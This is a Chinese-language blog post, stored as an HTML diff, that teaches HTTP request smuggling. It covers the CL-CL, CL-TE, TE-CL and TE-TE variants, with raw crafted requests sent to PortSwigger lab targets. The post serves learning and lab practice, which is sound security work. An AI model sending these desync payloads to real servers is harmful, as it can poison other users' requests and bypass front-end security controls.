@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      HTTP请求走私基础学习(一) | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>HTTP请求走私基础学习(一)</h2>
+  <p class="post-date">2019-10-17 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="HTTPS请求走私"><a href="#HTTPS请求走私" class="headerlink" title="HTTPS请求走私"></a>HTTPS请求走私</h1><p>该漏洞产生原因主要是前后端服务器对请求处理RFC标准不同。造成后端恶意代码缓存驻留</p>
+<p><img src="./smuggling-http-request-to-back-end-server.svg" alt="smuggling-http-request-to-back-end-server"></p>
+<h1 id="几个重要概念"><a href="#几个重要概念" class="headerlink" title="几个重要概念"></a>几个重要概念</h1><h3 id="TCP复用"><a href="#TCP复用" class="headerlink" title="TCP复用"></a>TCP复用</h3><p>为了节省代理服务器与后端服务器同效率，往往会复用同一个tcp连接</p>
+<p>参考链接：<a href="https://www.lushevol.com/2018/08/21/TCP%E8%BF%9E%E6%8E%A5%E5%A4%8D%E7%94%A8/" target="_blank" rel="noopener">https://www.lushevol.com/2018/08/21/TCP%E8%BF%9E%E6%8E%A5%E5%A4%8D%E7%94%A8/</a></p>
+<p><img src="./1571288904672.png" alt="1571288904672"></p>
+<h2 id="http1-1协议连接保持"><a href="#http1-1协议连接保持" class="headerlink" title="http1.1协议连接保持"></a>http1.1协议连接保持</h2><ul>
+<li><strong>Keep Alive</strong> mode</li>
+<li><strong>Pipelined</strong> queries</li>
+</ul>
+<h3 id="pipelining"><a href="#pipelining" class="headerlink" title="pipelining"></a>pipelining</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[Client]                  [End Server]</span><br><span class="line">       |                         |</span><br><span class="line">       &gt;-requ. Suzann ----------&gt;|</span><br><span class="line">       &gt;-requ. Ivan ------------&gt;|</span><br><span class="line">       &gt;-requ. Walter-----------&gt;|</span><br><span class="line">       |&lt;---------- resp. Suzann-&lt;</span><br><span class="line">       |&lt;------------ resp. Ivan-&lt;</span><br><span class="line">       |&lt;---------- resp. Walter-&lt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Keep-Alive"><a href="#Keep-Alive" class="headerlink" title="Keep Alive"></a>Keep Alive</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[Client]                  [End Server]</span><br><span class="line">    |                         |</span><br><span class="line">    &gt;-requ. Suzann ----------&gt;|</span><br><span class="line">    |&lt;---------- resp. Suzann-&lt;</span><br><span class="line">    &gt;-requ. Ivan ------------&gt;|</span><br><span class="line">    |&lt;------------ resp. Ivan-&lt;</span><br><span class="line">    &gt;-req. Walter------------&gt;|</span><br><span class="line">    |&lt;---------- resp. Walter-&lt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="HTTP-中间代理服务器和后端服务器通信示意图"><a href="#HTTP-中间代理服务器和后端服务器通信示意图" class="headerlink" title="HTTP 中间代理服务器和后端服务器通信示意图"></a>HTTP 中间代理服务器和后端服务器通信示意图</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[Client]             [Middleware]          [End Server]</span><br><span class="line">       |                     |                     |</span><br><span class="line">       &gt;-requ. Suzann ------&gt;|                     |</span><br><span class="line">       &gt;-requ. Ivan --------&gt;|                     |</span><br><span class="line">       &gt;-req. Walter -------&gt;|                     |</span><br><span class="line">       |                     &gt;-requ. Suzann ------&gt;|</span><br><span class="line">       |                     |&lt;------ resp. Suzann-&lt;</span><br><span class="line">       |&lt;------ resp. Suzann-&lt;                     |</span><br><span class="line">       |                     &gt;-requ. Ivan --------&gt;|</span><br><span class="line">       |                     |&lt;-------- resp. Ivan-&lt;</span><br><span class="line">       |&lt;-------- resp. Ivan-&lt;                     |</span><br><span class="line">       |                     &gt;-req. Walter--------&gt;|</span><br><span class="line">       |                     |&lt;------- resp Walter-&lt;</span><br><span class="line">       |&lt;------ resp. Walter-&lt;                     |</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="CL不为0的GET请求"><a href="#CL不为0的GET请求" class="headerlink" title="CL不为0的GET请求"></a>CL不为0的GET请求</h1><blockquote>
+<ol>
+<li><p>前端代理服务器允许GET请求携带请求体</p>
+</li>
+<li><p>后端服务器不允许GET请求携带请求体</p>
+</li>
+</ol>
+<p>：后端忽略GET请求中的Content-Length头，可以注入新的GET请求，由于Pipeline存在，后端判定收到两个请求</p>
+</blockquote>
+<p>如传入：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: example.com\r\n</span><br><span class="line"><span class="attribute">Content-Length</span>: 44\r\n</span><br><span class="line"></span><br><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+
+<p>前端<strong>允许</strong>GET携带请求体，所以将上述包传到后端，后端<strong>不允许</strong>GET请求携带请求体，认定为两个请求</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一个</span><br><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: example.com\r\n</span><br><span class="line"></span><br><span class="line">第二个</span><br><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: example.com\r\n</span><br></pre></td></tr></table></figure>
+
+<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>CL不为0的GET请求导致走私，<strong>主要是前后端服务器对Content-Length即请求体是否执行一致。</strong></p>
+<h1 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h1><blockquote>
+<p><a href="https://tools.ietf.org/html/rfc7230#section-3.3.3" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc7230#section-3.3.3</a></p>
+<p>RFC7230表明当一个http请求带有多个不同Content-length会导致400错误</p>
+</blockquote>
+<p><img src="./1571278218243.png" alt="1571278218243"></p>
+<h2 id="不规范操作"><a href="#不规范操作" class="headerlink" title="不规范操作"></a>不规范操作</h2><blockquote>
+<p>前端代理服务器和后端服务器接收多个Content-Length不会返回400错误。</p>
+<p>​    代理服务器使用第一个Content-Length处理数据</p>
+<p>​    后端代理服务器使用第二个Content-Length处理数据</p>
+</blockquote>
+<p>恶意包构建</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: <span class="number">8</span>\r\n</span><br><span class="line">Content-Length: <span class="number">7</span>\r\n</span><br><span class="line"></span><br><span class="line"><span class="number">12345</span>\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>
+
+<p>中间代理服务器处理请求体长度为8，处理到5。但后端服务器处理请求体长度为7,剩下的字符5会放入缓冲区。如果这时候在接收到一个如下get请求会携带a字符一起处理。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: example.com\r\n</span><br></pre></td></tr></table></figure>
+
+<p>实际处理结果,返回<code>aGET request method not found</code>，实现走私攻击。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGET /index.html HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: example.com\r\n</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<blockquote>
+<p><code>RFC2616</code>的第4.4节中，规定:<code>如果收到同时存在Content-Length和Transfer-Encoding这两个请求头的请求包时，在处理的时候必须忽略Content-Length</code></p>
+</blockquote>
+<h2 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h2><blockquote>
+<p>CL-TE: 接收两个请求头，前端代理服务器只处理Content-Length，后端遵守RFC2616忽略Content-Length，处理Transfer-Encoding</p>
+</blockquote>
+<h2 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h2><p>同时放入<strong>Content-Length和Transfer-Encoding</strong>头，访问正常</p>
+<p><img src="./1571287661298.png" alt="1571287661298"></p>
+<p>只放入<strong>Conetent-Length</strong>，连接挂起，因为服务端需要接收99个字节的请求体，可以证明服务区在对同时处理<strong>Content-Length与Transfer-Encoding会将Content-Length去除</strong></p>
+<p><img src="./1571287726810.png" alt="1571287726810"></p>
+<h2 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h2><p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p>
+<p>伪造http包</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ac5c1f3f1ee1d59780728119006600b8.web-security-academy.net</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: https://portswigger.net/users?returnurl=%2facademy%2flabs%2flaunch%2febc97abbe886e96facc0aaee856f55e2a45d4784f5d9025ffa5e994b7d8bc2bb%3freferrer%3d%252fweb-security%252frequest-smuggling%252flab-basic-cl-te</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Cookie</span>: session=JWPczeHT40XYRaExizH7ScudZ6hnlfX6</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 11</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line">\r\n</span><br><span class="line"><span class="attribute">0\r\n</span></span><br><span class="line"><span class="attribute">\r\n</span></span><br><span class="line"><span class="attribute">123456</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>关闭burpsuite自动更新Content-Length，多次发送以下包造成走私攻击</p>
+<p><img src="./1571288321363.png" alt="1571288321363"></p>
+<p>前端代理服务器就收到Content-Length长度为11，之后将以下请求体发送到后端服务器</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0\r\n</span></span><br><span class="line"><span class="attribute">\r\n</span></span><br><span class="line"><span class="attribute">123456</span></span><br></pre></td></tr></table></figure>
+
+<p>后端遵守RFC规则,抹除了<strong>Content-Length请求头</strong>，只处理<strong>Transfer-Encoding</strong>。一下是chunk传输格式，后端遇到连续的<code>0\r\n\r\n</code>会认为传输结束，这时’123456’就会被留在缓冲区会与下个http请求拼接。得到’123456POST’</p>
+<p>chunk传输格式</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h2 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h2><p>TE-CL就是当存在两个请求头，前端代理服务器处理<strong>Transfer-Encoding</strong>，后端服务器处理<strong>Content-Length请求头</strong></p>
+<h2 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h2><p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>构造请求包</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ac7f1fe61e17d5978046843b0047009f.web-security-academy.net</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: session=NBbX2y8mopewc0yIgkbqdn9BmgA8PKpt</span><br><span class="line"><span class="attribute">Content-Length</span>: 4</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line">\r\n</span><br><span class="line"><span class="attribute">12\r\n</span></span><br><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="attribute">0\r\n</span></span><br><span class="line"><span class="attribute">\r\n</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>前端代理服务器响应Transfer-Encoding，处理以下数据。Transfer-Encoding遇到<code>0\r\n\r\n</code>数据接收停止</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">\r\n</span><br><span class="line"><span class="attribute">12\r\n</span></span><br><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="attribute">0\r\n</span></span><br><span class="line"><span class="attribute">\r\n</span></span><br></pre></td></tr></table></figure>
+
+<p>后端服务器响应Content-Length，处理以下数据，接收4字节数据</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">12\r\n</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="./1571292321058.png" alt="1571292321058"></p>
+<h2 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h2><p> 前后端都处理<code>Transfer-Encoding</code>请求头，要点是前端接收可以处理的Transfer-Encoding头，后端接收无法识别的Transfer-Encoding头。类似<code>CL-TE</code>或者<code>TE-CL</code>，不同的是，如果不传入<code>Transfer-Encoding: xxx</code>后端扔会前后端扔会正常处理”Content-Length、Transfer-Encoding”，在CL-TE、TE-CL不行的情况下，可以考虑使用。</p>
+<h2 id="靶机-1"><a href="#靶机-1" class="headerlink" title="靶机"></a>靶机</h2><p><a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: acd11f061e2b224780f80459004500f2.web-security-academy.net</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Cookie</span>: session=iLGLf03I7Lu3VUWRK8KVmwoarv2Btbhu</span><br><span class="line"><span class="attribute">Content-Length</span>: 4</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: xxx</span><br><span class="line">\r\n</span><br><span class="line"><span class="attribute">5c\r\n</span></span><br><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded\r\n</span><br><span class="line"><span class="attribute">Content-Length</span>: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line"><span class="attribute">0\r\n</span></span><br><span class="line"><span class="attribute">\r\n</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="./1571293596089.png" alt="1571293596089"></p>
+<p>根据顺序，前端代理服务器处理<code>Transfer-Encoding: chuncked</code></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">\r\n</span><br><span class="line"><span class="attribute">5c\r\n</span></span><br><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded\r\n</span><br><span class="line"><span class="attribute">Content-Length</span>: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line"><span class="attribute">0\r\n</span></span><br><span class="line"><span class="attribute">\r\n</span></span><br></pre></td></tr></table></figure>
+
+<p>而后端处理<code>Transfer-Encoding: xxx</code> 无法识别，再识别<code>Content-Lengt: 4</code>处理四字节数据</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\r\n</span><br><span class="line"><span class="attribute">5c\r\n</span></span><br></pre></td></tr></table></figure>
+
+<p>所以就造成一下数据存入缓存中</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded\r\n</span><br><span class="line"><span class="attribute">Content-Length</span>: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line"><span class="attribute">0\r\n</span></span><br><span class="line"><span class="attribute">\r\n</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a>结论</h1><ol>
+<li>注意CLRF符号，如果<strong>Transfer-Encoding</strong>再遇到<code>\r\n</code>会认为还会有数据，<strong>(CL-TE)</strong></li>
+<li>TE-TE在CL-TE或者TE-CL不奏效时候可以尝试使用。</li>
+<li>不论是哪种方式的走私攻击，都是前后端服务器对RFC标准实现的不统一。</li>
+</ol>
+<blockquote>
+<p>CL不为0：利用前端允许GET带请求体，后端不允许，由于pipelining缘故，造成后端将请求体请求当做另一个请求</p>
+<p>CL-CL: 不限制post还是get请求(如果前后端允许接收get带有请求体)，传入不同值的Content-Length，前端代理服务器要大于后端服务器，后端服务器会将没读到的字符留在缓存，会附着在下一次请求上。</p>
+<p>CL-TE: 前端代理服务器只处理<code>content-length</code>，后端遵守RFC丢掉<code>content-length</code>只处理<code>Transfer-Encoding</code></p>
+<p>TE-CL: 前端只处理<code>transfer-encoding</code>，后端只处理<code>content-length</code></p>
+<p>TE-TE: 前后端都处理<code>transfer-encoding</code>,使得后端处理的transfer-encoding为无法识别,只处理<code>content-length</code></p>
+</blockquote>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<li><a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">https://paper.seebug.org/1048/</a></li>
+</ul>
+<ul>
+<li><a href="https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/" target="_blank" rel="noopener">https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/</a></li>
+<li><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank" rel="noopener">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a></li>
+<li><a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf" target="_blank" rel="noopener">https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf</a></li>
+<li><a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf" target="_blank" rel="noopener">https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf</a></li>
+</ul>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#HTTP请求走私" >
+    <span class="tag-code">HTTP请求走私</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/">
+        <span class="nav-arrow">← </span>
+        
+          RoarCTF2019_web题解(待补充)
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2019/10/17/ATS%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+        
+          ATS反向代理环境搭建
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#HTTPS请求走私"><span class="toc-nav-text">HTTPS请求走私</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#几个重要概念"><span class="toc-nav-text">几个重要概念</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#TCP复用"><span class="toc-nav-text">TCP复用</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#http1-1协议连接保持"><span class="toc-nav-text">http1.1协议连接保持</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#pipelining"><span class="toc-nav-text">pipelining</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Keep-Alive"><span class="toc-nav-text">Keep Alive</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#HTTP-中间代理服务器和后端服务器通信示意图"><span class="toc-nav-text">HTTP 